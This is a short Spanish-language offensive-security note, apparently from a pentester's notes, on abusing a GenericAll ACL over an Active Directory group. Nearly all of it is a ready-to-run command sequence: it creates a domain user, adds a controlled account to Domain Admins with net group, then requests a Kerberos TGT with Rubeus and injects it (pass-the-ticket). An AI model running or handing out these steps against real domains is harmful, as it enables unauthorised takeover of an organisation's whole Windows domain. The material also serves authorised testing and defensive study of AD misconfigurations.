# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericAll sobre Grupo

Si tenemos esta ACL sobre un grupo, tenemos control total sobre el objeto grupo, lo que permite modificar su membresía. En este flujo, utilizamos ese control para agregar usuarios al grupo Domain Admins, obteniendo así los privilegios asociados a sus miembros.

```powershell
# OPCIONAL 
❯ import-module .\Microsoft.ActiveDirectory.Management.dll

❯ Get-ADGroup "Domain Admins" -Properties * | select -ExpandProperty ntSecurityDescriptor | Format-List  # Enumeramos los grupos de AD, sus propiedades 
```

```powershell 
# Crear un usuario en el dominio (OPCIONAL)
❯ net user omar 'P@$$w0rd123!' /add /domain 
❯ net user omar    # Verificar el usuario 

# Paso 1: Agregar el usuario controlado al grupo Domain Admins
❯ net group "domain admins" ControlledAccount /add /domain

# Paso 2: Verificar que el usuario fue agregado correctamente
❯ net group "domain admins" /domain

# Paso 3: Si necesitas autenticarte como la cuenta controlada, solicitar un TGT con su contraseña y hacer Pass-The-Ticket
❯ .\Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt

# Alternativa: solicitar el TGT utilizando el hash RC4
❯ .\Rubeus.exe hash /password:Password@1
❯ .\Rubeus.exe asktgt /user:groupwrite.user /rc4:<RC4_HASH> /ptt

# Paso 4: Verificar los tickets Kerberos
❯ klist

# Objetivo:
# GenericAll sobre el grupo → modificar su membresía → agregar user.hacked a Domain Admins → user.hacked obtiene los privilegios asociados a Domain Admins.
```